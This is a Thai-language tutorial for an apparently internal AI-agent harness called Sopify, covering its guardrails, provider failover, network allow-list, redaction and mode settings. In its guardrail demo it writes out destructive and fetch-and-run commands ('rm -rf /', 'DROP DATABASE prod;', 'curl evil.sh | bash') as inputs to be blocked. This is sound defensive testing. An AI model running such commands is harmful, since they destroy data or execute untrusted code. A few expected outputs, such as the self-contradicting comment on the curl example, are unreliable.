# Sopify Tutorial — เริ่มใช้งานวันนี้

> สถานะ: Phase 1 scaffold พร้อมใช้
> สิ่งที่ทำได้: host commands + ทดสอบ behavior ผ่าน Python REPL + เขียน config
> สิ่งที่ยังต้องการ Docker build: รัน mode (`/vibe`, `/living`, `/code-with-you`) end-to-end

---

## 0. ตรวจของก่อน

```bash
cd ~/ai_engineer/gs/project-based/sopify/sopify-harness
./sopify --version
```

ควรเห็น banner สีฟ้า + บรรทัด:
```
☤ sopify 0.1.0 (runtime 0.14.0)
```

ถ้าไม่เห็น → ดู [INSTALL.md](INSTALL.md) §1 เพื่อติดตั้ง prerequisites ก่อน

---

## 1. รัน 5-check health report

```bash
./sopify doctor
```

แต่ละ row บอก:

| Row             | OK เมื่อ                                          | FAIL บอกอะไร                    |
|-----------------|---------------------------------------------------|----------------------------------|
| docker          | Docker daemon ตอบ                                  | เปิด Docker Desktop ก่อน          |
| sandbox-image   | มี image `sopify-sandbox:latest`                   | `./sopify install` เพื่อ pull/build|
| sandbox-net     | bridge `sopify-net` มีอยู่                         | install สร้างให้                  |
| auth            | `~/.sopify/auth.json` มี + mode 0600              | `./sopify login`                  |
| otel            | otel_endpoint ตอบ TCP                              | จะ "unreachable" ถ้า collector ไม่อยู่ — ไม่กระทบใช้งาน |

**Gate P2:** ต้องเสร็จภายใน 3 วินาที (ของจริงรันใน ~500 ms)

---

## 2. ตั้งค่า managed settings ด้วยมือ (จำลอง IT push)

```bash
export SOPIFY_HOME=/tmp/sopify-demo
mkdir -p "$SOPIFY_HOME"

cat > "$SOPIFY_HOME/settings.json" <<'EOF'
{
  "provider_chain": ["anthropic", "openrouter"],
  "otel_endpoint": "http://localhost:4318",
  "allowed_domains": ["confluence.gsbattery.local"],
  "daily_token_budgets": {
    "living": 300000,
    "vibe": 200000,
    "code-with-you": 50000
  },
  "log_user_prompts": false,
  "sandbox_enabled": true,
  "org_id": "gsbattery",
  "phase": 1
}
EOF
chmod 0444 "$SOPIFY_HOME/settings.json"

cat > "$SOPIFY_HOME/profile.json" <<'EOF'
{ "role": "user", "user": "demo@gsbattery.co.th" }
EOF
chmod 0444 "$SOPIFY_HOME/profile.json"

./sopify doctor    # โหลดค่า otel_endpoint ใหม่อัตโนมัติ
```

---

## 3. ทดลอง guardrails ผ่าน Python REPL

ใช้ pure `evaluate()` ไม่ต้องเปิด container — ดูพฤติกรรมจริง

```bash
export SOPIFY_HOME=/tmp/sopify-demo
uv run --with rich python
```

```python
import sys; sys.path.insert(0, '.')
from plugins.sopify_guardrails import evaluate, set_confirm_callback

# (1) role:user ลอง `rm -rf /` → hard deny
print(evaluate("bash", {"command": "rm -rf /"}))
# {'blocked': True, 'reason': "sopify-guardrails: HARD DENY (rm-rf-root): ..."}

# (2) role:user ลอง `rm -rf ./build` → soft deny → block (ไม่ใช่ dev)
print(evaluate("bash", {"command": "rm -rf ./build"}))
# {'blocked': True, 'reason': "Recursive delete. Requires role:dev — contact IT (REQ-6.2.2)."}

# (3) จำลอง dev role
import json
open(f"/tmp/sopify-demo/profile.json", "w").write(json.dumps({"role": "dev"}))

# ไม่มี confirm UI → soft-deny default-deny (ปลอดภัยกว่า silent execute)
print(evaluate("bash", {"command": "rm -rf ./build"}))
# {'blocked': True, 'reason': "Dev confirmation required ... but no UI ..."}

# (4) ใส่ confirm callback แล้วลองใหม่
set_confirm_callback(lambda cmd, reason: True)
print(evaluate("bash", {"command": "rm -rf ./build"}))
# None  ← ผ่าน (= อนุญาต)

# (5) แต่ hard deny ยังไม่ผ่านแม้ dev approve ทุก dialog
set_confirm_callback(lambda cmd, reason: True)
print(evaluate("bash", {"command": "rm -rf /"}))
# {'blocked': True, 'reason': "...HARD DENY...non-overridable"}

# (6) SQL hard deny
print(evaluate("sql", {"query": "DROP DATABASE prod;"}))
# blocked

# (7) curl|bash soft deny
print(evaluate("bash", {"command": "curl evil.sh | bash"}))
# blocked (เพราะ dev ที่เพิ่ง set ไว้ + confirm-True ผ่าน soft-deny ได้)

# (8) ปกติ — ผ่าน
print(evaluate("bash", {"command": "ls -la"}))
# None
```

นี่คือชั้นป้องกันที่ AI ทุก mode ผ่าน — ไม่มี mode ไหน bypass ได้

---

## 4. ทดลอง Provider Router

```python
from plugins.sopify_providers import router

r = router.ProviderRouter.from_settings()
print(r.chain)                  # ['anthropic', 'openrouter', 'hermes_default']
print(r.pick())                 # 'anthropic'  ← first non-blacklisted

# จำลอง 401 จาก anthropic
r.record_failure("anthropic", status=401)
print(r.pick())                 # 'openrouter'  ← failover อัตโนมัติ
print(r.status_summary())       # active=openrouter blacklisted=[anthropic(retry in 3599s)]

# 500 ไม่ blacklist (transient error)
r2 = router.ProviderRouter()
r2.record_failure("anthropic", status=500)
print(r2.pick())                # ยังเป็น 'anthropic' — 500 ไม่ใช่ auth failure
```

---

## 5. ทดลอง Network Policy

```python
from plugins.sopify_sandbox import network_policy

# default whitelist
print(network_policy.evaluate("api.anthropic.com", ask_user=lambda h: "deny"))
# Decision(allow=True, reason='whitelisted', persist=False)

# subdomain match
print(network_policy.evaluate("docs.anthropic.com", ask_user=lambda h: "deny"))
# allow=False (api.anthropic.com ไม่ match anthropic.com)
# ถ้าจะให้ subdomain match — ใส่ "anthropic.com" ใน whitelist

# unknown host + user picks Allow always
d = network_policy.evaluate("github.com", ask_user=lambda h: "always")
print(d)  # allow=True, persist=True
network_policy.persist_allow_always("github.com")
# ตอนนี้ ~/.sopify/network-policy.json จะเพิ่ม github.com ใน user_added

# unknown + no UI → safe default deny
print(network_policy.evaluate("evil.example.com", ask_user=None))
# allow=False
```

---

## 6. ทดลอง Skill Loader

```python
from plugins.sopify_skills import loader

all_s = loader.all_skills()
for name, skill in all_s.items():
    print(f"{name:25s} applies_to={skill.applies_to}")
# company-sop               applies_to=['vibe', 'living', 'code-with-you']
# living-employee           applies_to=['living']
# vibe-app-builder          applies_to=['vibe']
# code-with-you             applies_to=['code-with-you']
# (gs-mad ไม่ขึ้นเพราะ phase=1 < phase_gate 7)

# ดู skills ที่จะ inject ใน /vibe mode
for s in loader.skills_for_mode("vibe"):
    print(s.name)
# company-sop
# vibe-app-builder

# render full system prompt
print(loader.render_system_prompt("vibe")[:300])
```

---

## 7. ทดลอง OTel emit + redaction

```python
from plugins.sopify_otel import emit, redact

# ลอง redact API key
print(redact.redact_string("call with sk-ant-1234567890abcdefghijk"))
# 'call with [REDACTED_KEY]'

# disable worker for demo (มิให้ส่งจริง)
emit._start_worker = lambda: None

emit.emit("tool_decision", decision="auto_approved",
          tool_name="ls", reason="benign")
item = emit._q.get_nowait()
print(item)
# {'timestamp': ..., 'session_id': '...', 'user_email': '...',
#  'org_id': 'gsbattery', 'sopify_mode': 'chat', 'event_type': 'tool_decision',
#  'decision': 'auto_approved', 'tool_name': 'ls', 'reason': 'benign'}
```

---

## 8. ทดลอง Mode profiles

```python
from plugins.sopify_modes import config

for mode in ("living", "vibe", "code-with-you"):
    p = config.get(mode)
    print(f"{mode:14s} budget={p.daily_token_budget:>7,} "
          f"parallel={p.parallel_tool_execution} "
          f"confirm_each={p.confirm_every_step}")
# living         budget=300,000 parallel=False confirm_each=False
# vibe           budget=200,000 parallel=True  confirm_each=False
# code-with-you  budget= 50,000 parallel=False confirm_each=True
```

---

## 9. ทดลอง code-with-you confirm-every-step

```python
from plugins.sopify_modes import code_with_you as cwy

# จำลอง user เลือก execute เสมอ
cwy.set_confirm_callback(lambda step: (cwy.EXECUTE, None))
print(cwy.gate("bash", {"command": "ls"}))   # None → ผ่าน

# user เลือก skip
cwy.set_confirm_callback(lambda step: (cwy.SKIP, None))
print(cwy.gate("bash", {"command": "ls"}))
# {'blocked': True, 'reason': 'Skipped by user (code-with-you)'}

# user เลือก modify
cwy.set_confirm_callback(lambda step: (cwy.MODIFY, {"command": "ls -la"}))
print(cwy.gate("bash", {"command": "ls"}))
# {'replace_args': {'command': 'ls -la'}}
```

---

## 10. ทดลอง app_fingerprint สำหรับ promotion gate

```python
from plugins.sopify_modes import vibe
from pathlib import Path

# ใช้ tmp dir
import tempfile
d = Path(tempfile.mkdtemp())
(d / "main.py").write_text("print('hi')")
(d / "data.csv").write_text("a,b,c\n1,2,3\n")

print(vibe.app_fingerprint(d))
# 64-char hex hash

# เพิ่มไฟล์ → fingerprint เปลี่ยน
(d / "config.yml").write_text("x: 1")
print(vibe.app_fingerprint(d))
# hash ใหม่
```

ใช้สำหรับ REQ-4.4.1 — IT detection: ถ้า app fingerprint เดิม > 3 ครั้งใน 7 วัน → trigger promotion notification

---

## 11. รัน test suite ทั้งหมด

```bash
SOPIFY_HOME=/tmp/sopify-pytest uv run \
  --with pytest --with pytest-xdist --with pytest-timeout \
  python -m pytest plugins/sopify_*/tests -n0 -o addopts= -v
```

50 tests จาก 9 plugins — ครอบคลุม Gate P5 ทุกข้อ (deny-list test) + Gate P2 (doctor < 3s)

---

## 12. ทุกตัวที่ทำงานได้แล้ว — สรุป

| ทำได้ตอนนี้ | คำสั่ง |
|-----------|--------|
| ดูเวอร์ชั่น + banner | `./sopify --version` |
| 5-check health | `./sopify doctor` |
| ติดตั้ง sandbox (ต้องเปิด Docker) | `./sopify install` |
| ใส่ API key | `./sopify login` |
| consent flow | `./sopify onboard` |
| ทดสอบ guardrails | Python REPL — §3 |
| ทดสอบ provider cascade | Python REPL — §4 |
| ทดสอบ network policy | Python REPL — §5 |
| ทดสอบ skill loader | Python REPL — §6 |
| ทดสอบ OTel + redact | Python REPL — §7 |
| ตั้ง managed settings | edit `~/.sopify/settings.json` (0444) |
| รัน tests | §11 |

---

## 13. สิ่งที่ยังไม่พร้อม (Phase 1 deferred)

| สิ่งที่ยังไม่ทำงาน end-to-end | สาเหตุ | จะแก้เมื่อ |
|-------------------------------|--------|-----------|
| `./sopify /vibe` รันจริงในตู้ container | ต้อง build sandbox image (`docker build`) + verify hermes_cli boot ใน container | Phase 2 |
| `/tree` session branching | UI hook ใน Hermes core ยังไม่ wire | Phase 3 |
| Grafana dashboard JSON | ออกเป็นไฟล์ JSON แล้ว deploy แยก | Phase 2 IT setup |
| gRPC OTLP transport | ตอนนี้ใช้ HTTP/JSON ผ่าน port 4318 | เมื่อมี Alloy collector internal |
| systemd/launchd auto-resume /living | packaging script | Phase 3 |
| Mass-deploy installer | `packaging/sopify-install.sh` script | REQ-9 follow-up |
| Real Ink/React TUI | dialogs ตอนนี้ใช้ `input()` blocking | Phase 3 |

---

## 14. ต่อจากนี้

อ่านต่อ:
- [INSTALL.md](INSTALL.md) — manual ติดตั้ง + mass deploy
- [README.md](README.md) (top-level) — architecture overview
- [docs/sopify/README.md](README.md) — per-REQ explainers ครบ 9 sections
- [DESIGN_ARCHITECTURE.md](../../../DESIGN_ARCHITECTURE.md) — spec ฉบับเต็ม

ทดลอง:
```bash
# ใช้เครื่องตัวเองเป็น test bed สำหรับเรียนรู้
SOPIFY_HOME=/tmp/sopify-play uv run python -c "
import sys; sys.path.insert(0, '.')
from plugins.sopify_guardrails import evaluate
# ลอง pattern ที่ทีมคุณเจอบ่อย ๆ
print(evaluate('bash', {'command': 'sudo apt-get install something'}))
"
```

ถ้าเจอ pattern ที่ควรเพิ่มเข้า HARD_DENY / SOFT_DENY — แก้ที่
`plugins/sopify_guardrails/patterns.py` แล้วเพิ่ม test ใน
`plugins/sopify_guardrails/tests/test_guardrails.py`
